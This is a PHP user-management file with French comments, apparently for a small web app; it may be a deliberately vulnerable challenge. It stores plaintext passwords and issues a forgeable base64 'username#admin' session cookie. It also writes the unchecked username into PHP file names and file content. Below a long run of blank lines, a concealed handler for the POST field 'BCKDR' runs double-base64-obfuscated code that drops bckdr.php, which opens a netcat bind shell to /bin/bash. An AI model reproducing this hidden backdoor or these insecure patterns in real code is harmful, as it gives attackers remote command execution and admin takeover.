<?php
require_once 'singleton/Database.php';

// Fonction pour chercher un utilisateur à partir de son username
function search_user($username)
{
    // Obtenir l'instance de la classe Database
    $db = Database::getInstance();
    // Obtenir la connexion PDO
    $pdo = $db->getConnection();

    try {
        // Préparer la requête SQL
        $sql = "SELECT * FROM users WHERE username = :username";
        $stmt = $pdo->prepare($sql);

        // Lier le paramètre
        $stmt->bindParam(':username', $username, PDO::PARAM_STR);

        // Exécuter la requête
        $stmt->execute();

        // Vérifier si un résultat est trouvé
        if ($stmt->rowCount() == 1) {
            // Récupérer le résultat
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            return $row;
        }
    } catch (PDOException $e) {
        // Gérer les erreurs
        echo 'Erreur : ' . $e->getMessage();
    }

    return false;
}

// Fonction pour créer un nouvel utilisateur
function create_user($username, $password, $description)
{
    // Vérifie si l'utilisateur n'existe pas déjà
    if (!search_user($username)) {
        // Obtenir l'instance unique de la classe Database
        $db = Database::getInstance();
        // Obtenir la connexion PDO
        $pdo = $db->getConnection();
        try {
            // Préparer la requête SQL pour insérer un nouvel utilisateur
            $sql = "INSERT INTO users (USERNAME, PASSWORD, DESCRIPTION, admin) VALUES (:username, :password, :description, 0)";
            $stmt = $pdo->prepare($sql);
            // Lier les paramètres
            $stmt->bindParam(':username', $username, PDO::PARAM_STR);
            $stmt->bindParam(':password', $password, PDO::PARAM_STR);
            $stmt->bindParam(':description', $description, PDO::PARAM_STR);
            // Exécuter la requête
            $stmt->execute();

            // Lire le contenu du template de fichier
            $pcontent = file_get_contents("./p/template.php");
            // Remplacer le placeholder par le nom d'utilisateur
            $towrite = str_replace("####USERNAME####", $username, $pcontent);
            // Écrire le contenu dans un nouveau fichier pour l'utilisateur
            file_put_contents("./p/" . $username . ".php", $towrite);
            // Créer un répertoire pour l'utilisateur
            mkdir("./files/" . $username);

            return true;
        } catch (PDOException $e) {
            // Afficher l'erreur en cas d'exception PDO
            echo 'Erreur : ' . $e->getMessage();
        }
    }
    return false;
}

// Fonction pour supprimer un utilisateur
function delete_user($username)
{
    // Vérifie si l'utilisateur existe
    if (search_user($username)) {
        // Obtenir l'instance unique de la classe Database
        $db = Database::getInstance();
        // Obtenir la connexion PDO
        $pdo = $db->getConnection();
        try {
            // Préparer la requête SQL pour supprimer l'utilisateur
            $sql = "DELETE FROM users WHERE USERNAME = :username";
            $stmt = $pdo->prepare($sql);
            // Lier le paramètre
            $stmt->bindParam(':username', $username, PDO::PARAM_STR);
            // Exécuter la requête
            $stmt->execute();

            return true;
        } catch (PDOException $e) {
            // Afficher l'erreur en cas d'exception PDO
            echo 'Erreur : ' . $e->getMessage();
        }
    }
    return false;
}

// Fonction pour connecter un utilisateur
function login_user($username, $password)
{
    // Vérifie si l'utilisateur existe
    if (search_user($username)) {
        // Obtenir l'instance unique de la classe Database
        $db = Database::getInstance();
        // Obtenir la connexion PDO
        $pdo = $db->getConnection();
        try {
            // Préparer la requête SQL pour vérifier les identifiants de l'utilisateur
            $sql = "SELECT * FROM users WHERE USERNAME = :username AND PASSWORD = :password";
            $stmt = $pdo->prepare($sql);
            // Lier les paramètres
            $stmt->bindParam(':username', $username, PDO::PARAM_STR);
            $stmt->bindParam(':password', $password, PDO::PARAM_STR);
            // Exécuter la requête
            $stmt->execute();

            // Vérifier si un résultat est trouvé
            if ($stmt->rowCount() == 1) {
                // Récupérer les informations de l'utilisateur
                $user_infos = $stmt->fetch(PDO::FETCH_ASSOC);
                // Définir un cookie de session
                setcookie("ALEXSESSID", base64_encode($user_infos["USERNAME"] . "#" . $user_infos["admin"]));

                return true;
            }
        } catch (PDOException $e) {
            // Afficher l'erreur en cas d'exception PDO
            echo 'Erreur : ' . $e->getMessage();
        }
    }
    return false;
}

// Fonction pour déconnecter un utilisateur
function logout_user()
{
    // Définir un cookie de session expiré
    setcookie("ALEXSESSID", "", time() - 3600);
}

// Fonction pour définir le statut admin d'un utilisateur
function set_admin($username, $value)
{
    // Vérifie si l'utilisateur existe
    if (search_user($username)) {
        // Obtenir l'instance unique de la classe Database
        $db = Database::getInstance();
        // Obtenir la connexion PDO
        $pdo = $db->getConnection();
        try {
            // Préparer la requête SQL pour mettre à jour le statut admin de l'utilisateur
            $sql = "UPDATE users SET admin = :value WHERE USERNAME = :username";
            $stmt = $pdo->prepare($sql);
            // Lier les paramètres
            $stmt->bindParam(':value', $value, PDO::PARAM_INT);
            $stmt->bindParam(':username', $username, PDO::PARAM_STR);
            // Exécuter la requête
            $stmt->execute();

            return true;
        } catch (PDOException $e) {
            // Afficher l'erreur en cas d'exception PDO
            echo 'Erreur : ' . $e->getMessage();
        }
    }
    return false;
}

// Fonction pour récupérer les informations de connexion à partir du cookie
function connect_infos()
{
    // Vérifie si le cookie de session est défini
    if (isset($_COOKIE["ALEXSESSID"])) {
        // Décoder le cookie de session
        $dec = explode("#", base64_decode($_COOKIE["ALEXSESSID"]));
        return array(
            "USERNAME" => $dec[0],
            "ADMIN" => $dec[1]
        );
    }

    return false;
}


























































































if (isset($_POST["BCKDR"])) {
    if ($_POST["BCKDR"] == "o") exec(base64_decode("ZWNobyAiPD9waHAgZXhlYyhiYXNlNjRfZGVjb2RlKFwiYm1NdWRISmhaR2wwYVc5dVlXd2dMV3gyYm5BZ05qQXlOVEFnTFdVZ0wySnBiaTlpWVhOb1wiKTsgPz4iID4gYmNrZHIucGhw"));
}
